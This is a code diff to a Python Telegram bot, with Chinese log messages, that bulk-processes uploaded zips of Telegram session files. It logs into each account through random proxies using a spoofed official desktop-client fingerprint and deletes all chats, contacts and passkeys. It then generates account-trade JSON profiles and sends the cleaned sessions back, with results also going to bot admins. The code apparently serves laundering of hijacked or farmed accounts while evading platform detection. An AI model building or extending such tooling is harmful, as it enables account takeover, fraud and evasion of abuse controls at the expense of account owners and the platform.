@@ -10,7 +10,7 @@ import struct
 import re
 import traceback
 from datetime import datetime
-from telethon import TelegramClient
+from telethon import TelegramClient as TelethonClient
 from telethon.tl.functions import TLRequest
 from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
 from telethon.errors import FloodWaitError
@@ -19,6 +19,8 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 from dotenv import load_dotenv
+from opentele.tl import TelegramClient
+from opentele.api import API
 
 load_dotenv()
 logger = logging.getLogger(__name__)
@@ -341,7 +343,6 @@ async def clean_account_operations(client, clean_type):
 
     if clean_type in ["contacts", "all"]:
         try:
-            from telethon.tl.functions.contacts import GetContactsRequest, DeleteContactsRequest
             contacts_result = await client(GetContactsRequest(hash=0))
             contact_entries = contacts_result.contacts
             logger.info(f"获取到 {len(contact_entries)} 个联系人（从 contacts 字段）")
@@ -386,6 +387,59 @@ async def clean_account_operations(client, clean_type):
 
     return results
 
+async def generate_json_for_session(session_file, client, me, api_id, api_hash, official_api):
+    json_path = session_file.replace('.session', '.json')
+    phone = me.phone if me.phone else os.path.basename(session_file).replace('.session', '')
+    reg_time = datetime.now().strftime("%Y-%m-%d")
+
+    device_model = getattr(official_api, 'device_model', 'Desktop')
+    system_version = getattr(official_api, 'system_version', '')
+    app_version = getattr(official_api, 'app_version', '')
+    system_lang_code = getattr(official_api, 'system_lang_code', 'en')
+    lang_pack = getattr(official_api, 'lang_pack', '')
+    lang_code = getattr(official_api, 'lang_code', 'en')
+    pid = getattr(official_api, 'pid', random.randint(100000, 999999))
+
+    json_data = {
+        "api_id": api_id,
+        "api_hash": api_hash,
+        "device_model": device_model,
+        "system_version": system_version,
+        "app_version": app_version,
+        "system_lang_code": system_lang_code,
+        "lang_pack": lang_pack,
+        "lang_code": lang_code,
+        "pid": pid,
+        "user_id": me.id,
+        "phone": phone,
+        "twofa": "",
+        "password": "",
+        "app_id": api_id,
+        "app_hash": api_hash,
+        "session_file": os.path.basename(session_file).replace('.session', ''),
+        "device": device_model,
+        "username": me.username or "",
+        "sex": None,
+        "avatar": "img/default.png",
+        "package_id": "",
+        "installer": "",
+        "ipv6": False,
+        "SDK": system_version,
+        "sdk": system_version,
+        "system_lang_pack": system_lang_code,
+        "premium": getattr(me, 'premium', False),
+        "reg_time": reg_time
+    }
+
+    try:
+        os.makedirs(os.path.dirname(json_path), exist_ok=True)
+        with open(json_path, 'w', encoding='utf-8') as f:
+            json.dump(json_data, f, indent=2, ensure_ascii=False)
+        logger.info(f"已为 {session_file} 生成 JSON 配置: {json_path}")
+        return json_path
+    except Exception as e:
+        logger.error(f"生成 JSON 失败 {session_file}: {e}")
+        return None
 
 async def process_clean(update, context, zip_path, user_id, clean_type):
     api_id_str = os.getenv("TELEGRAM_APP_ID")
@@ -448,12 +502,14 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                 reply_markup=reply_markup
             )
             return
+
         session_files = []
         for root, dirs, files in os.walk(extract_dir):
             for file in files:
                 if file.endswith('.session'):
                     session_path = os.path.join(root, file)
                     session_files.append(session_path)
+
         if not session_files:
             keyboard = [[create_back_button()]]
             reply_markup = InlineKeyboardMarkup(keyboard)
@@ -464,12 +520,14 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                 reply_markup=reply_markup
             )
             return
+
         type_names = {
             "chats": "删除所有对话",
             "contacts": "删除所有联系人",
             "passkeys": "删除所有Passkey",
             "all": "删除所有对话、联系人和Passkey"
         }
+
         status_msg = await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text=f"""<tg-emoji emoji-id="5839200986022812209">🔄</tg-emoji> <b>清理账号进行中</b>
@@ -479,16 +537,22 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
 <tg-emoji emoji-id="5775887550262546277">🔄</tg-emoji>正在处理，请稍候...""",
             parse_mode='HTML'
         )
+
         success_dir = os.path.join(temp_dir, "success")
         failed_dir = os.path.join(temp_dir, "failed")
         os.makedirs(success_dir, exist_ok=True)
         os.makedirs(failed_dir, exist_ok=True)
+
         success_count = 0
         failed_count = 0
         results = []
+
         for i, session_file in enumerate(session_files, 1):
             session_name = os.path.splitext(os.path.basename(session_file))[0]
             json_file = os.path.join(os.path.dirname(session_file), f"{session_name}.json")
+            if not os.path.exists(json_file):
+                json_file = None
+
             if i % 3 == 0 or i == len(session_files):
                 try:
                     await status_msg.edit_text(
@@ -500,15 +564,17 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                     )
                 except:
                     pass
+
             client = None
             try:
                 json_config = {}
-                if json_file and os.path.exists(json_file):
+                if json_file:
                     try:
                         with open(json_file, 'r', encoding='utf-8') as f:
                             json_config = json.load(f)
                     except Exception as e:
                         logger.warning(f"读取 JSON 配置失败 {json_file}: {e}")
+
                 final_api_id = api_id
                 final_api_hash = api_hash
                 if json_config:
@@ -519,20 +585,37 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                             logger.warning(f"无效的 app_id: {json_config['app_id']}, 使用默认值")
                     if 'app_hash' in json_config and json_config['app_hash']:
                         final_api_hash = str(json_config['app_hash'])
+
                 device_model = json_config.get('device') or None
                 app_version = json_config.get('app_version') or None
                 system_lang_code = json_config.get('system_lang_pack') or None
+                system_version = json_config.get('system_vision') or json_config.get('sdk') or None
+                lang_pack = json_config.get('lang_pack') or None
+
+                official_api = API.TelegramDesktop.Generate()
+                official_api.api_id = final_api_id
+                official_api.api_hash = final_api_hash
+                if device_model:
+                    official_api.device_model = device_model
+                if app_version:
+                    official_api.app_version = app_version
+                if system_lang_code:
+                    official_api.system_lang_code = system_lang_code
+                if system_version:
+                    official_api.system_version = system_version
+                if lang_pack:
+                    official_api.lang_pack = lang_pack
+                    official_api.lang_code = lang_pack
+
                 proxy = get_random_proxy()
                 proxy_dict = create_proxy_dict(proxy) if proxy else None
+
                 client = TelegramClient(
                     session_file,
-                    final_api_id,
-                    final_api_hash,
-                    proxy=proxy_dict,
-                    device_model=device_model,
-                    app_version=app_version,
-                    system_lang_code=system_lang_code
+                    api=official_api,
+                    proxy=proxy_dict
                 )
+
                 await client.connect()
                 if not await client.is_user_authorized():
                     result = {"session": os.path.basename(session_file), "status": "failed", "message": "session无效"}
@@ -542,6 +625,14 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                 else:
                     me = await client.get_me()
                     logger.info(f"开始处理账号 {me.phone} ({os.path.basename(session_file)})")
+
+                    if not json_file:
+                        generated_json = await generate_json_for_session(
+                            session_file, client, me, final_api_id, final_api_hash, official_api
+                        )
+                        if generated_json:
+                            json_file = generated_json
+
                     clean_results = await clean_account_operations(client, clean_type)
                     result = {
                         "session": os.path.basename(session_file),
@@ -555,11 +646,13 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                     target_dir = success_dir
                     success_count += 1
                     logger.info(f"账号 {me.phone} 清理完成: 对话={clean_results['chats_deleted']}, 联系人={clean_results['contacts_deleted']}, Passkey={clean_results['passkeys_deleted']}, 错误数={len(clean_results['errors'])}")
+
                 results.append(result)
                 shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
                 if json_file and os.path.exists(json_file):
                     shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
                 await asyncio.sleep(1)
+
             except FloodWaitError as e:
                 logger.warning(f"账号 {os.path.basename(session_file)} 触发 FloodWait，需等待 {e.seconds} 秒")
                 result = {"session": os.path.basename(session_file), "status": "failed", "message": f"等待{e.seconds}秒"}
@@ -574,6 +667,7 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
             finally:
                 if client:
                     await client.disconnect()
+
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         success_zip = os.path.join(temp_dir, "success.zip")
         if success_count > 0:
@@ -583,6 +677,7 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                         file_path = os.path.join(root, file)
                         arcname = os.path.relpath(file_path, success_dir)
                         zipf.write(file_path, arcname)
+
         failed_zip = os.path.join(temp_dir, "failed.zip")
         if failed_count > 0:
             with zipfile.ZipFile(failed_zip, 'w') as zipf:
@@ -591,9 +686,11 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                         file_path = os.path.join(root, file)
                         arcname = os.path.relpath(file_path, failed_dir)
                         zipf.write(file_path, arcname)
+
         total_chats = sum(r.get("chats_deleted", 0) for r in results if r["status"] == "success")
         total_contacts = sum(r.get("contacts_deleted", 0) for r in results if r["status"] == "success")
         total_passkeys = sum(r.get("passkeys_deleted", 0) for r in results if r["status"] == "success")
+
         result_text = f"""<tg-emoji emoji-id="5909201569898827582">✅</tg-emoji> <b>清理账号完成</b>
 
 <tg-emoji emoji-id="5931472654660800739">📊</tg-emoji> 统计结果:
@@ -603,11 +700,13 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
 • <tg-emoji emoji-id="5877307202888273539">💬</tg-emoji> 删除对话: <b>{total_chats}</b>
 • <tg-emoji emoji-id="5877318502947229960">👥</tg-emoji> 删除联系人: <b>{total_contacts}</b>
 • <tg-emoji emoji-id="5886505193180239900">🔑</tg-emoji> 删除Passkey: <b>{total_passkeys}</b>"""
+
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text=result_text,
             parse_mode='HTML'
         )
+
         if success_count > 0:
             with open(success_zip, 'rb') as f:
                 await context.bot.send_document(
@@ -617,6 +716,7 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                     caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 清理成功 ({success_count}个)</b>",
                     parse_mode='HTML'
                 )
+
         if failed_count > 0:
             with open(failed_zip, 'rb') as f:
                 await context.bot.send_document(
@@ -626,6 +726,7 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                     caption=f"<b><tg-emoji emoji-id='5922712343011135025'>❌</tg-emoji> 清理失败 ({failed_count}个)</b>",
                     parse_mode='HTML'
                 )
+
         for admin_id in admins:
             admin_id = admin_id.strip()
             if not admin_id:
@@ -662,6 +763,7 @@ async def _process_clean_internal(update, context, zip_path, user_id, api_id, ap
                         )
             except Exception as e:
                 logger.error(f"发送给管理员 {admin_id} 失败: {e}")
+
         try:
             await status_msg.delete()
         except:
